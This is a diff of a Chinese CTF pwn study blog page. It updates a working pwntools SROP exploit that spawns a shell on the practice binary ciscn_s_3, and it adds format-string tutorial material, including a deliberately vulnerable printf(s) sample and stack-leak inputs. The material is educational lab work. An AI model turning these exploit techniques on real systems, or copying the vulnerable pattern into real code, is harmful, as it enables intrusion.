@@ -21,14 +21,14 @@
   
     <meta name="description" content="hello，pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwn做题记录">
+<meta property="og:title" content="pwn学习记录">
 <meta property="og:url" content="http://yzsandw.com/2025/05/14/pwn%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/index.html">
 <meta property="og:site_name" content="5Y2z_blog">
 <meta property="og:description" content="hello，pwn">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/pwn%E8%AE%B0%E5%BD%95.png">
 <meta property="article:published_time" content="2025-05-14T06:42:45.000Z">
-<meta property="article:modified_time" content="2025-11-20T08:44:48.251Z">
+<meta property="article:modified_time" content="2025-12-23T01:12:30.356Z">
 <meta property="article:author" content="5Y2z">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary_large_image">
@@ -36,7 +36,7 @@
   
   
   
-  <title>pwn做题记录 - 5Y2z_blog</title>
+  <title>pwn学习记录 - 5Y2z_blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -213,7 +213,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="pwn做题记录"></span>
+            <span id="subtitle" data-typed-text="pwn学习记录"></span>
           
         </div>
 
@@ -247,7 +247,7 @@
         
         
         
-          89 分钟
+          95 分钟
         
       </span>
     
@@ -284,7 +284,7 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">pwn做题记录</h1>
+            <h1 id="seo-header">pwn学习记录</h1>
             
             
               <div class="markdown-body">
@@ -640,12 +640,14 @@
 <p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251119202220606.png" srcset="/img/loading.gif" lazyload alt="image-20251119202220606"></p>
 <p>思路基本上就是这样，接下来就需要构造POC一步步pwn掉：</p>
 <p>下面给出pwntools集成的SROP攻击构造方法：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">frame=SigreturnFrame()<br>frame.rax=<span class="hljs-number">59</span><br>frame.rdi=binsh<br>frame.rip=syscall<br>frame.rsi=<span class="hljs-number">0</span><br>payload=<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>*<span class="hljs-number">2</span>+p64(gadget)+p64(syscall)+<span class="hljs-built_in">str</span>(frame)<br>p.send(payload)<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">frame = SigreturnFrame()<br>frame.rax = constants.SYS_execve<br>frame.rdi = binsh<br>frame.rsi = <span class="hljs-number">0x0</span><br>frame.rdx = <span class="hljs-number">0x0</span><br>frame.rip = syscall_addr<br>payload=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="hljs-number">2</span>+p64(sig_addr)+p64(syscall_addr)+<span class="hljs-built_in">bytes</span>(frame)<br>p.send(payload)<br></code></pre></td></tr></table></figure>
 <p>POC构造如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&#x27;./ciscn_s_3&#x27;</span>)<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<span class="hljs-comment">#Important!!!!!!!!!!Important!!!!!!!!!!</span><br>vuln_addr = <span class="hljs-number">0x004004ED</span><br><br>sig_addr = <span class="hljs-number">0x04004DA</span><br><br>syscall_addr = <span class="hljs-number">0x0400501</span><br><br>offset = <span class="hljs-number">0x128</span><br>payload1 = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)+p64(vuln_addr)<br>p.send(payload1)<br><br>binsh = u64(p.recv()[<span class="hljs-number">32</span>:<span class="hljs-number">40</span>]) - offset<br>log.success(<span class="hljs-string">&#x27;binsh = &#x27;</span> + <span class="hljs-built_in">hex</span>(binsh))<br><br>frame = SigreturnFrame()<br>frame.rax = constants.SYS_execve<br>frame.rdi = binsh<br>frame.rsi = <span class="hljs-number">0x0</span><br>frame.rdx = <span class="hljs-number">0x0</span><br>frame.rip = syscall_addr<br>payload=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="hljs-number">2</span>+p64(sig_addr)+p64(syscall_addr)+<span class="hljs-built_in">bytes</span>(frame)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = remote(&#x27;node5.buuoj.cn&#x27;,26385)</span><br>p = process(<span class="hljs-string">&#x27;./ciscn_s_3&#x27;</span>)<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<span class="hljs-comment">#Important!!!!!!!!!!Important!!!!!!!!!!</span><br>vuln_addr = <span class="hljs-number">0x004004ED</span><br><br>sig_addr = <span class="hljs-number">0x04004DA</span><br><br>syscall_addr = <span class="hljs-number">0x0400501</span><br><br>offset = <span class="hljs-number">0x128</span><br>payload1 = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)+p64(vuln_addr)<br>p.send(payload1)<br><br>binsh = u64(p.recv()[<span class="hljs-number">32</span>:<span class="hljs-number">40</span>]) - offset<br>log.success(<span class="hljs-string">&#x27;binsh = &#x27;</span> + <span class="hljs-built_in">hex</span>(binsh))<br><br>frame = SigreturnFrame()<br>frame.rax = constants.SYS_execve<br>frame.rdi = binsh<br>frame.rsi = <span class="hljs-number">0x0</span><br>frame.rdx = <span class="hljs-number">0x0</span><br>frame.rip = syscall_addr<br>payload=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="hljs-number">2</span>+p64(sig_addr)+p64(syscall_addr)+<span class="hljs-built_in">bytes</span>(frame)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
 <h1 id="08-Format-String">08 Format String</h1>
 <p>格式化字符串（英语：format string）是一些程序设计语言的输入/输出库中能将字符串参数转换为另一种形式输出的函数。例如C、C++等程序设计语言的printf类函数，其中的转换说明（conversion specification）用于把随后对应的0个或多个函数参数转换为相应的格式输出；格式化字符串中转换说明以外的其它字符原样输出。</p>
 <p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/Printf.svg.png" srcset="/img/loading.gif" lazyload alt="Printf.svg"></p>
+<p>格式化占位符（format placeholder），语法是：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">%<span class="hljs-selector-attr">[parameter]</span><span class="hljs-selector-attr">[flags]</span><span class="hljs-selector-attr">[field width]</span><span class="hljs-selector-attr">[.precision]</span><span class="hljs-selector-attr">[length]</span>type<br></code></pre></td></tr></table></figure>
 <h2 id="原理">原理</h2>
 <p>我们上面说，格式化字符串函数是根据格式化字符串来进行解析的 。<strong>那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制</strong>。比如说’%s’表明我们会输出一个字符串参数。</p>
 <p>对于上面的例子，在进入 printf 函数的之前 (即还没有调用 printf)，栈上的布局由高地址到低地址依次如下。</p>
@@ -672,6 +674,34 @@
 <p>对于 2，3 来说倒还无妨，但是对于对于 1 来说，如果提供了一个不可访问地址，比如 0，那么程序就会因此而崩溃。</p>
 <p>这基本就是格式化字符串漏洞的基本原理了。</p>
 <h2 id="利用-2">利用</h2>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>];<br>  <span class="hljs-type">int</span> a = <span class="hljs-number">1</span>, b = <span class="hljs-number">0x22222222</span>, c = <span class="hljs-number">-1</span>;<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s);<br>  <span class="hljs-built_in">printf</span>(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>编译时编译器会给出提示：</p>
+<p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251121110911308.png" srcset="/img/loading.gif" lazyload alt="image-20251121110911308"></p>
+<p>下面，我们来看一下，如何获取对应的栈内存。</p>
+<h3 id="泄露内存">泄露内存</h3>
+<h4 id="泄露栈内存">泄露栈内存</h4>
+<p><strong>获取栈变量数值</strong></p>
+<p>由于格式化字符串为 %x%x%x，所以，程序会将栈上的数值分别作为第一，第二，第三个参数按照 int 型进行解析，分别输出。由此可以获取栈变量的数值，接下来我们来尝试一下：</p>
+<p>我们先输入%08x.%08x.%08x，然后敲击回车，可以看出程序首先断在了第一次调用 printf 函数的位置。</p>
+<p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251222205714498.png" srcset="/img/loading.gif" lazyload alt="image-20251222205714498"></p>
+<p>可以看出，此时此时已经进入了 printf 函数中，栈中第一个变量为返回地址，第二个变量为格式化字符串的地址，第三个变量为 a 的值，第四个变量为 b 的值，第五个变量为 c 的值，第六个变量为我们输入的格式化字符串对应的地址。继续运行程序</p>
+<p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251222205950941.png" srcset="/img/loading.gif" lazyload alt="image-20251222205950941"></p>
+<p>可以看出，程序确实输出了每一个变量对应的数值，并且断在了下一个 printf 处。</p>
+<p>我们看栈上的情况，接下来代码不会再将08x.%08x.%08x当作字符串输出，而是输出其为正常格式化字符串，也就是其会解析栈上的地址作为%x的参数输出，继续运行，我们可以得到如下结果去，确实和想象中的一样。</p>
+<p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251222210207367.png" srcset="/img/loading.gif" lazyload alt="image-20251222210207367"></p>
+<p>当然，我们也可以使用 %p 来获取数据，如下</p>
+<blockquote>
+<p>这里需要注意的是，并不是每次得到的结果都一样 ，因为栈上的数据会因为每次分配的内存页不同而有所不同，这是因为栈是不对内存页做初始化的。</p>
+</blockquote>
+<p><strong>需要注意的是，我们上面给出的方法，都是依次获得栈中的每个参数，我们有没有办法直接获取栈中被视为第 n+1 个参数的值呢</strong>？肯定是可以的啦。我们看格式化字符串中有这样的规则：</p>
+<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-built_in">%n</span><span class="hljs-built_in">$type</span><br></code></pre></td></tr></table></figure>
+<p>表示这个格式说明符（specifier）显示第几个参数</p>
+<p>利用如下的字符串，我们就可以获取到对应的第 n+1 个参数的数值。为什么这里要说是对应第 n+1 个参数呢？这是因为格式化参数里面的 n 指的是该格式化字符串对应的第 n 个输出参数，那相对于输出函数来说，就是第 n+1 个参数了。</p>
+<p>这里我们再次以 gdb 调试一下。</p>
+<p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251222211122443.png" srcset="/img/loading.gif" lazyload alt="image-20251222211122443"></p>
+<p>可以看出，我们确实获得了 printf 的第 4 个参数所对应的值0x804918d。</p>
+<p><strong>获取栈变量对应字符串</strong></p>
+<h4 id="泄露任意地址内存">泄露任意地址内存</h4>
 <h1 id="09-天璇战队2025招新">09 天璇战队2025招新</h1>
 <h2 id="ret">ret</h2>
 <p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251011153617006.png" srcset="/img/loading.gif" lazyload alt="image-20251011153617006"></p>
@@ -741,7 +771,7 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>pwn做题记录</div>
+      <div>pwn学习记录</div>
       <div>http://yzsandw.com/2025/05/14/pwn做题记录/</div>
     </div>
     <div class="license-meta">
